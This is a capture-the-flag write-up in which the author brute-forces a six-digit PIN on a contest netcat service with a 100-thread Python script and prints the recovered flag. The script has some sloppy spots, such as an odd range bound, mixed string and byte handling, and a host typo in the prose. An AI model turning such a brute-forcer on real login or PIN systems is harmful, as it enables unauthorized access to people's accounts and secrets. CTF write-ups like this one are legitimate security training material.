# Simply Secure Secrets (50 points, misc)

## Problem
`nc p1.tjctf.org 8000`

## Solution
Running the command mentioned above, we are taken to a service:
```
Welcome to the Simply Secure Service! (TRIAL)
The product: an impregnable bunker for your most vulnerable secrets.
---------------------------------------------
Commands:
    l - List all secret names
    s - Store a secret
    r - Reveal a secret
    u - Upgrade to PRO
    h - Display this help menu
    x - Exit service
> 
```
Let's poke around a little bit.
```
> l
List of stored secret names:
  - tjctf
  - evan
  - omkar
> 
```

Interesting. The secret is probably inside of `tjctf`. Let's retrieve it with the previously-mentioned `r` command.
```
> r
Secret name: tjctf
Secret pin:
```
It's now asking for a pin number. Let's enter something random and see what happens.
```
Secret pin: 1
Secret pin must be in ###### format.
```
Let's see if we get anything back if we enter a pin number in the format the program wants.
```
Secret pin: 000001
Invalid pin. The appropriate authorities have been notified.
> 
```

Not the police.

Well, my first thought would be to bruteforce this problem, and it seems I was right.

### The Script

``` Python
import socket
import threading
import time

# https://gist.github.com/leonjza/f35a7252babdf77c8421 
class Netcat:

    """ Python 'netcat like' module """

    def __init__(self, ip, port):

        self.buff = ""
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.connect((ip, port))

    def read(self, length = 1024):

        """ Read 1024 bytes off the socket """

        return self.socket.recv(length)
 
    def read_until(self, data):

        """ Read data into the buffer until we have data """

        while not data in self.buff:
            self.buff += self.socket.recv(1024)
 
        pos = self.buff.find(data)
        rval = self.buff[:pos + len(data)]
        self.buff = self.buff[pos + len(data):]
 
        return rval
 
    def write(self, data):

        self.socket.send(data)

    def writeln(self, data):

        data += b"\n"
        self.socket.send(data)

    def close(self):

        self.socket.close()

class SolverThread(threading.Thread):
    def run(self):
        thread_number = int(threading.currentThread().getName())
        self.do_the_stuff(10000, thread_number)

    def do_the_stuff(self, cracking_range, thread_number):
        nc = Netcat('p1.tjctf.org', 8000)
        for x in range(cracking_range * thread_number, cracking_range *
                (thread_number + 10000)):
            nc.buff = b''
            print(nc.read_until(b">"))
            nc.writeln(str.encode("r"))
            nc.read_until(b"Secret")
            nc.writeln(str.encode("tjctf"))
            nc.read_until(b"Secret")
            print(str(x).zfill(6))
            nc.writeln(str.encode(str(x).zfill(6)))

def main():
    for x in range(100):
        thread = SolverThread(name = "{}".format(x + 1))
        thread.daemon = True # allow us to Ctrl+C to kill all threads
        thread.start()
    while True:
        time.sleep(1)

if __name__ == '__main__':
    main()
```

Yeah. It's kind of a mess. It works by creating 100 threads, each tasked with:.
1. Creating a netcat connection to `pi.tjctf.org 8000`
2. Then, in a loop:
	1. Sending a bunch of commands to reach the pin entry prompt (as demonstrated above)
	2. Checking one of the pin numbers it's assigned (via its thread number)
	3. Printing what it returns (for use by `tee -a` and `grep`.

Run the script with `python3 sss.py | tee -a flag` and to use it, in another window, occaisonaly grep the file for `tjctf`, it shows up eventually.

```
$ python3 sss.py | tee -a flag.txt
$ grep tjctf flag.txt
b'Secret content: tjctf{1_533_y0u_f0rc3d_y0ur_w4y_1n}\n>'
```

